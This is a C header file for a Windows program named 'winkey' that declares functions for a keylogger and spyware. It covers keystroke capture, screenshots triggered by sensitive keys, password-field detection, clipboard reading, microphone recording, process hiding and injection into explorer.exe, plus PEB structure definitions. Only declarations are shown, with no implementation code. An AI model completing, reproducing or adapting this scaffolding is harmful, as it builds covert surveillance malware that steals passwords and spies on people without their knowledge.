#ifndef WINKEY_H
#define WINKEY_H

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

typedef struct _RTL_USER_PROCESS_PARAMETERS 
{
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB 
{
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
} PEB, *PPEB;

#ifdef _M_X64
PPEB GetPEB(void) 
{
	return (PPEB)__readgsqword(0x60);
}
#else
PPEB GetPEB(void) 
{
	return (PPEB)__readfsdword(0x30);
}
#endif


int vk_to_char(DWORD vkCode, char *out);
void get_time(char *buf);
char *special_touch(DWORD vk);
void get_window_title(char *title);

void hide_process(wchar_t *new_name);
static DWORD find_pid(void);
int inject_into_explorer(void);
int capture_screen(LPCWSTR path);
void on_special_event(void);
void screenshot_on_sensitive_key(DWORD vk, DWORD modifiers);
int is_password_field(HWND hwnd);
int *allow_app(char *exe);
void read_clipboard(char *buffer, size_t size);

void capture_micro(void);
int get_buffer(HRESULT *hr, IAudioCaptureClient *captureClient);
#endif